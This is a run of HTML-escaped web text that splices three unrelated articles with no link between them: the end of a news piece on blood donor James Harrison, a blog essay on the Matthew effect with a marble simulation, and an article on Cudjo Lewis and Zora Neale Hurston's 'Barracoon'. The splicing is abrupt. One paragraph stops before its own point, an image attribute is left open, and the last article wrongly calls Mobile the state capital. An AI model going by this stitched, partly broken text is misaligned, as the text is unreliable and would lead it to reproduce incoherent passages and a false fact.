&lt;p&gt;&quot;In Australia, up until about 1967, there were literally thousands of babies dying each year, doctors didn't know why, and it was awful,” Jemma Falkenmire, of the Australian Red Cross Blood Service, told &lt;a href=&quot;https://edition.cnn.com/2018/05/11/health/james-harrison-blood-donor-retires-trnd/index.html?sr=fbCNN051118james-harrison-blood-donor-retires-trnd1020AMVODtop&quot; target=&quot;_blank&quot;&gt;CNN&lt;/a&gt; in 2015. “Women were having numerous miscarriages and babies were being born with brain damage. Australia was one of the first countries to discover a blood donor with this antibody, so it was quite revolutionary at the time.&lt;/p&gt;
&lt;div class=&quot;dnd-widget-wrapper context-sdl_editor_representation type-gallery&quot;&gt;
&lt;div class=&quot;dnd-atom-rendered&quot;&gt;
&lt;div class=&quot;image&quot;&gt;&lt;div class=&quot;container grid-mod-gallery&quot; data-scald-gallery=&quot;3906401&quot;&gt;
&lt;h2 class=&quot;gallery-title&quot;&gt;World news in pictures&lt;/h2&gt;

&lt;/div&gt;

&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&quot;Every bag of blood is precious, but James' blood is particularly extraordinary. Every batch of the life-saving Anti-D that has ever been made in Australia has come from James' blood. And more than 17 per cent of women in Australia are at risk so James has helped save a lot of lives.&quot;&lt;/p&gt;
&lt;p&gt;Doctors don’t know for certain why Mr Harrison has this rare blood type, but suspect it may have been caused by the transfusions he received after his lung operation.&lt;/p&gt;
&lt;p&gt;He is one of fewer than 50 people in Australia known to have the antibodies, the blood service said.&lt;/p&gt;
&lt;p&gt;Now he has retired, they are hoping other people will come forward with blood containing similar antibodies. &lt;/p&gt;
&lt;p&gt;&quot;All we can do is hope there will be people out there generous enough to do it, and selflessly in the way he's done,&quot; said Ms Falkenmire.&lt;/p&gt;

&lt;p name=&quot;c2df&quot; id=&quot;c2df&quot; class=&quot;graf graf--p graf-after--figure&quot;&gt;In the late 1970s the view in the publishing world was that an author should never produce more than one book a year. The thinking was that publishing more than one book a year would dilute the brand name of the author. However, this was a bit of a problem for Stephen King, who was writing books at a rate of &lt;em class=&quot;markup--em markup--p-em&quot;&gt;two&lt;/em&gt; per year. Instead of slowing down, King decided to publish his additional works under the pen name of &lt;a href=&quot;https://en.wikipedia.org/wiki/Richard_Bachman&quot; data-href=&quot;https://en.wikipedia.org/wiki/Richard_Bachman&quot; class=&quot;markup--anchor markup--p-anchor&quot; rel=&quot;noopener&quot; target=&quot;_blank&quot;&gt;Richard Bachman&lt;/a&gt;.&lt;/p&gt;
&lt;p name=&quot;2eb8&quot; id=&quot;2eb8&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;Over the next few years, every book King published sold millions, while Richard Bachman remained relatively unknown. King was a legend. Bachman a nobody. However, this all changed when a book store clerk in Washington, D.C. named Steve Brown noticed the similarity of writing styles between King and Bachman. After being confronted with the evidence, King confessed and agreed to an interview with Brown a few weeks later. &lt;a href=&quot;https://amzn.to/2r6XLzr&quot; data-href=&quot;https://amzn.to/2r6XLzr&quot; class=&quot;markup--anchor markup--p-anchor&quot; rel=&quot;noopener&quot; target=&quot;_blank&quot;&gt;The Click Moment: Seizing Opportunity in an Unpredictable World&lt;/a&gt; tells the story of what happened next:&lt;/p&gt;
&lt;blockquote name=&quot;c32a&quot; id=&quot;c32a&quot; class=&quot;graf graf--blockquote graf-after--p&quot; readability=&quot;13&quot;&gt;
&lt;p&gt;In 1986, once the secret was out, King re-released all of Bachman’s published works under his real name and they skyrocketed up bestseller lists. The first run of Thinner had sold 28,000 copies — the most of any Bachman book and above average for an author. The moment it became known that Richard Bachman was Stephen King, however, the Bachman books took off with sales quickly reaching 3 million copies.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p name=&quot;0b5e&quot; id=&quot;0b5e&quot; class=&quot;graf graf--p graf-after--blockquote&quot;&gt;This phenomenon isn’t exclusive to Stephen King either. J.K. Rowling published a book called &lt;a href=&quot;https://en.wikipedia.org/wiki/The_Cuckoo%27s_Calling&quot; data-href=&quot;https://en.wikipedia.org/wiki/The_Cuckoo%27s_Calling&quot; class=&quot;markup--anchor markup--p-anchor&quot; rel=&quot;noopener&quot; target=&quot;_blank&quot;&gt;The Cuckoo’s Calling&lt;/a&gt; under the pen name Robert Galbraith only to be &lt;a href=&quot;https://www.smithsonianmag.com/science-nature/how-did-computers-uncover-jk-rowlings-pseudonym-180949824/&quot; data-href=&quot;https://www.smithsonianmag.com/science-nature/how-did-computers-uncover-jk-rowlings-pseudonym-180949824/&quot; class=&quot;markup--anchor markup--p-anchor&quot; rel=&quot;noopener&quot; target=&quot;_blank&quot;&gt;outed by someone performing advanced text analysis&lt;/a&gt; with a computer. Shortly after the public discovered Galbraith was Rowling, &lt;em class=&quot;markup--em markup--p-em&quot;&gt;The Cuckoo’s Calling&lt;/em&gt; &lt;a href=&quot;https://www.newstatesman.com/culture/2013/07/sales-cuckoos-calling-surge-150000-after-jk-rowling-revealed-author&quot; data-href=&quot;https://www.newstatesman.com/culture/2013/07/sales-cuckoos-calling-surge-150000-after-jk-rowling-revealed-author&quot; class=&quot;markup--anchor markup--p-anchor&quot; rel=&quot;noopener&quot; target=&quot;_blank&quot;&gt;increased in sales by over 150,000%&lt;/a&gt; shooting to the #3 on Amazon’s bestseller list after previously being ranked 4,709th.&lt;/p&gt;
&lt;p name=&quot;fd0e&quot; id=&quot;fd0e&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;Both King and Rowling’s foray into undercover writing reveals a harsh truth about success and social status — &lt;strong class=&quot;markup--strong markup--p-strong&quot;&gt;winners keep winning&lt;/strong&gt;. This idea is formally known as cumulative advantage, or &lt;a href=&quot;https://en.wikipedia.org/wiki/Matthew_effect&quot; data-href=&quot;https://en.wikipedia.org/wiki/Matthew_effect&quot; class=&quot;markup--anchor markup--p-anchor&quot; rel=&quot;noopener&quot; target=&quot;_blank&quot;&gt;the Matthew effect&lt;/a&gt;, and explains how those who start with an advantage relative to others can retain that advantage over long periods of time. This effect has also been shown to describe how &lt;a href=&quot;http://www.princeton.edu/~mjs3/salganik_dodds_watts06_full.pdf&quot; data-href=&quot;http://www.princeton.edu/~mjs3/salganik_dodds_watts06_full.pdf&quot; class=&quot;markup--anchor markup--p-anchor&quot; rel=&quot;noopener&quot; target=&quot;_blank&quot;&gt;music gets popular&lt;/a&gt;, but applies to any domain that can result in fame or social status. I discovered this concept by reading &lt;a href=&quot;https://twitter.com/mjmauboussin&quot; data-href=&quot;https://twitter.com/mjmauboussin&quot; class=&quot;markup--anchor markup--p-anchor&quot; rel=&quot;noopener&quot; target=&quot;_blank&quot;&gt;Michael Mauboussin’s&lt;/a&gt; &lt;a href=&quot;https://amzn.to/2roUvid&quot; data-href=&quot;https://amzn.to/2roUvid&quot; class=&quot;markup--anchor markup--p-anchor&quot; rel=&quot;noopener&quot; target=&quot;_blank&quot;&gt;The Success Equation&lt;/a&gt; where he writes:&lt;/p&gt;
&lt;blockquote name=&quot;0eff&quot; id=&quot;0eff&quot; class=&quot;graf graf--blockquote graf-after--p&quot; readability=&quot;9&quot;&gt;
&lt;p&gt;The Matthew effect explains how two people can start in nearly the same place and end up worlds apart. In these kinds of systems, initial conditions matter. And as time goes on, they matter more and more.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p name=&quot;007c&quot; id=&quot;007c&quot; class=&quot;graf graf--p graf-after--blockquote&quot;&gt;This explains how King and Rowling sell millions while Bachman and Galbraith don’t, despite being of similar quality. While I find these anecdotes &lt;a href=&quot;https://mobile.nytimes.com/2007/04/15/magazine/15wwlnidealab.t.html&quot; data-href=&quot;https://mobile.nytimes.com/2007/04/15/magazine/15wwlnidealab.t.html&quot; class=&quot;markup--anchor markup--p-anchor&quot; rel=&quot;noopener&quot; target=&quot;_blank&quot;&gt;and others&lt;/a&gt; useful, we can illustrate cumulative advantage using a simple simulation.&lt;/p&gt;
&lt;p name=&quot;3d66&quot; id=&quot;3d66&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;To start, imagine we have 400 marbles in a bag equally spread across 4 different colors (i.e. 100 black, 100 blue, 100 red, 100 green). Now we draw a color at random and add 1 &lt;em class=&quot;markup--em markup--p-em&quot;&gt;additional&lt;/em&gt; marble of that &lt;em class=&quot;markup--em markup--p-em&quot;&gt;same&lt;/em&gt; color back to the bag. So, if we drew a green marble in the first round, we would have 101 green marbles, 100 red, 100 black, and 100 blue in the bag at &lt;em class=&quot;markup--em markup--p-em&quot;&gt;the&lt;/em&gt; &lt;em class=&quot;markup--em markup--p-em&quot;&gt;end&lt;/em&gt; of the first round. We would keep drawing marbles and adding the 1 additional marble to the bag over 40 rounds and then end the game.&lt;/p&gt;
&lt;p name=&quot;53d2&quot; id=&quot;53d2&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;One such simulation of this game could look like this (Note: the colors represent the marble market shares in each round):&lt;/p&gt;
&lt;div class=&quot;aspectRatioPlaceholder is-locked&quot;&gt;

&lt;img class=&quot;graf-image&quot; data-image-id=&quot;1*b8R--kww5KHIkJavY55Y9Q.jpeg&quot; data-width=&quot;1771&quot; data-height=&quot;1417&quot; data-action=&quot;zoom&quot; data-action-value=&quot;1*b8R--kww5KHIkJavY55Y9Q.jpeg&quot; src=&quot;https://cdn-images-1.medium.com/max/1600/1*b8R--kww5KHIkJavY55Y9Q.jpeg&quot;/&gt;&lt;/div&gt;
&lt;p name=&quot;4b6e&quot; id=&quot;4b6e&quot; class=&quot;graf graf--p graf-after--figure&quot;&gt;As you can see, there is very little variation in market shares because the reward size (1 marble) is small relative to the total number of starting marbles (400). The distribution of the market share at round 40 (“final market share”) across 1,000 simulations for any one color could look like this:&lt;/p&gt;
&lt;div class=&quot;aspectRatioPlaceholder is-locked&quot;&gt;

&lt;img class=&quot;graf-image&quot; data-image-id=&quot;1*rqVWsXlIWJLjWSTBoJfQxA.jpeg&quot; data-width=&quot;1771&quot; data-height=&quot;1417&quot; data-action=&quot;zoom&quot; data-action-value=&quot;1*rqVWsXlIWJLjWSTBoJfQxA.jpeg&quot; src=&quot;https://cdn-images-1.medium.com/max/1600/1*rqVWsXlIWJLjWSTBoJfQxA.jpeg&quot;/&gt;&lt;/div&gt;
&lt;p name=&quot;4881&quot; id=&quot;4881&quot; class=&quot;graf graf--p graf-after--figure&quot;&gt;As we expect, the mean final market share with no starting advantage is 25% with a very small standard deviation.&lt;/p&gt;
&lt;p name=&quot;4486&quot; id=&quot;4486&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;However, &lt;strong class=&quot;markup--strong markup--p-strong&quot;&gt;what if we rigged the game such that we gave a particular color an advantage to start?&lt;/strong&gt; For example, instead of giving 1 &lt;em class=&quot;markup--em markup--p-em&quot;&gt;additional&lt;/em&gt; marble in each round, we give 100 additional marbles in each round. If we did this, one color would have a market share of 40% (200/500) while the remaining colors had a share 20% (100/500) starting round 2. This is a starting advantage of 20% (40% — 20%) in market share. One such simulation, where green is given the starting advantage, could look like this:&lt;/p&gt;
&lt;div class=&quot;aspectRatioPlaceholder is-locked&quot;&gt;

&lt;img class=&quot;graf-image&quot; data-image-id=&quot;1*Er03aemDE6oOkl3VrAQw8Q.jpeg&quot; data-width=&quot;1771&quot; data-height=&quot;1417&quot; data-action=&quot;zoom&quot; data-action-value=&quot;1*Er03aemDE6oOkl3VrAQw8Q.jpeg&quot; src=&quot;https://cdn-images-1.medium.com/max/1600/1*Er03aemDE6oOkl3VrAQw8Q.jpeg&quot;/&gt;&lt;/div&gt;
&lt;p name=&quot;7a98&quot; id=&quot;7a98&quot; class=&quot;graf graf--p graf-after--figure&quot;&gt;As you can see, the green color starts with a huge lead and never gives it up over time. Across 1,000 simulations like the one above, the distribution of final market share for the &lt;em class=&quot;markup--em markup--p-em&quot;&gt;advantaged&lt;/em&gt; color (i.e. green) could look like this:&lt;/p&gt;

Instead of marbles though it could be wealth, or popularity, or book sales. And most of these outcomes are greatly influenced by chance events. We like to think in America that most things come down to hard work, but a few lucky (or unlucky) breaks early on can have lasting effects over decades. If we look at luck in this way, it can change the way you view your life…&lt;/p&gt;

<title>The Last Slave Ship Survivor Gave an Interview in the 1930s</title>

<description>&lt;p&gt;&lt;span&gt;Roughly 60 years after the abolition of&lt;/span&gt; &lt;a href=&quot;https://www.history.com/topics/black-history/slavery&quot;&gt;&lt;span&gt;slavery&lt;/span&gt;&lt;/a&gt;&lt;span&gt;, anthropologist&lt;/span&gt; &lt;a href=&quot;https://www.history.com/this-day-in-history/zora-neale-hurston-is-born&quot;&gt;&lt;span&gt;Zora Neale Hurston&lt;/span&gt;&lt;/a&gt; &lt;span&gt;made an&lt;/span&gt; &lt;a href=&quot;http://www.vulture.com/2018/04/zora-neale-hurston-barracoon-excerpt.html&quot;&gt;&lt;span&gt;incredible connection&lt;/span&gt;&lt;/a&gt;&lt;span&gt;: She located the last surviving captive of the last slave ship to bring Africans to the United States.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;Hurston, a known figure of the&lt;/span&gt; &lt;a href=&quot;https://www.history.com/topics/black-history/harlem-renaissance&quot;&gt;&lt;span&gt;Harlem Renaissance&lt;/span&gt;&lt;/a&gt; &lt;span&gt;who would later write the novel&lt;/span&gt; &lt;em&gt;&lt;span&gt;Their Eyes Were Watching God&lt;/span&gt;&lt;/em&gt;&lt;span&gt;, conducted interviews with the survivor but struggled to publish them as a book in the early 1930s. In fact, they are only now being released to the public in a book called&lt;/span&gt; &lt;a href=&quot;https://www.harpercollins.com/9780062748201/barracoon&quot;&gt;&lt;em&gt;&lt;span&gt;Barracoon: The Story of the Last “Black Cargo”&lt;/span&gt;&lt;/em&gt;&lt;/a&gt; &lt;span&gt;that comes out on May 8, 2018.&lt;/span&gt;&lt;/p&gt;
&lt;a href=&quot;https://cdn.history.com/sites/2/2018/05/GettyImages-615294140-square.jpg&quot;&gt;&lt;img class=&quot;wp-image-205830 size-full&quot; src=&quot;https://cdn.history.com/sites/2/2018/05/GettyImages-615294140-square.jpg&quot; alt=&quot;Author Zora Neale Hurston (1903-1960).

&lt;p&gt;&lt;span&gt;Hurston’s book tells the story of Cudjo Lewis, who was born in what is now the West African country of Benin. Originally named Kossula, he was only 19 years old when members of the neighboring Dahomian tribe captured him and took him to the coast. There, he and about 120 others were sold into slavery and crammed onto the&lt;/span&gt; &lt;a href=&quot;https://www.history.com/news/clotilda-wreck-discovered-last-us-slave-ship&quot;&gt;&lt;em&gt;&lt;span&gt;Clotilda&lt;/span&gt;&lt;/em&gt;&lt;/a&gt;&lt;span&gt;, the last slave ship to reach the continental United States.&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;The&lt;/span&gt; &lt;em&gt;&lt;span&gt;Clotilda&lt;/span&gt;&lt;/em&gt; &lt;span&gt;brought its captives to Alabama in 1860, just a year before the outbreak of the&lt;/span&gt; &lt;a href=&quot;https://www.history.com/topics/american-civil-war&quot;&gt;&lt;span&gt;Civil War&lt;/span&gt;&lt;/a&gt;&lt;span&gt;. Even though slavery was legal at that time in the U.S., the international slave trade was not, and hadn’t been for over 50 years. Along with many European nations, the U.S. had &lt;a href=&quot;https://www.history.com/this-day-in-history/congress-abolishes-the-african-slave-trade&quot;&gt;outlawed the practice&lt;/a&gt; in 1807, but Lewis’ journey is an example of how slave traders went around the law to continue bringing over human cargo.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;To avoid detection, Lewis’ captors snuck him and the other survivors into Alabama at night and made them hide in a swamp for several days. To hide the evidence of their crime, the 86-foot sailboat was then set ablaze&lt;/span&gt; &lt;span&gt;on the banks of the Mobile-Tensaw Delta&lt;/span&gt; &lt;span&gt;(its remains may have been&lt;/span&gt; &lt;a href=&quot;https://www.history.com/news/clotilda-wreck-discovered-last-us-slave-ship&quot;&gt;&lt;span&gt;uncovered&lt;/span&gt;&lt;/a&gt; &lt;span&gt;in January 2018).&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;Most poignantly, Lewis’ narrative provides a first-hand account of the disorienting trauma of slavery. After being abducted from his home, Lewis was forced onto a ship with strangers. The abductees spent several months together during the treacherous passage to the United States, but were then separated in Alabama to go to different plantations.&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;“We very sorry to be parted from one ’nother,” Lewis told Hurston. “We seventy days cross de water from de Affica soil, and now dey part us from one ’nother. Derefore we cry. Our grief so heavy look lak we cain stand it. I think maybe I die in my sleep when I dream about my mama.”&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;Lewis also describes what it was like to arrive on a plantation where no one spoke his language, and could explain to him where he was or what was going on. “We doan know why we be bring ’way from our country to work lak dis,” he told Hurston. “Everybody lookee at us strange. We want to talk wid de udder colored folkses but dey doan know whut we say.”&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;As for the Civil War, Lewis said he wasn’t aware of it when it first started. But part-way through, he began to hear that the North had started a war to free enslaved people like him. A few days after Confederate General&lt;/span&gt; &lt;a href=&quot;https://www.history.com/topics/american-civil-war/robert-e-lee&quot;&gt;&lt;span&gt;Robert E. Lee&lt;/span&gt;&lt;/a&gt; &lt;span&gt;surrendered in April 1865, Lewis says that a group of Union soldiers stopped by a boat on which he and other enslaved people were working and told them they were free.&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;Lewis expected to receive compensation for being kidnapped and forced into slavery, and was angry to discover that emancipation didn’t come with the promise of “forty acres and a mule,” or any other kind of reparations. Frustrated by the refusal of the government to provide him with land to live on after stealing him away from his homeland, he and a group of 31 other freepeople saved up money to buy land near the state capital of Mobile, which they called Africatown.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;Hurston’s use of vernacular dialogue in both her novels and her anthropological interviews was often controversial, as some black American thinkers at the time argued that this played to black caricatures in the minds of white people. Hurston disagreed, and refused to change Lewis’ dialect—which was one of the reasons a publisher turned her manuscript down back in the 1930s.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;Many decades later, her principled stance means that modern readers will get to hear Lewis’ story the way that he told it.&lt;/span&gt;&lt;/p&gt;
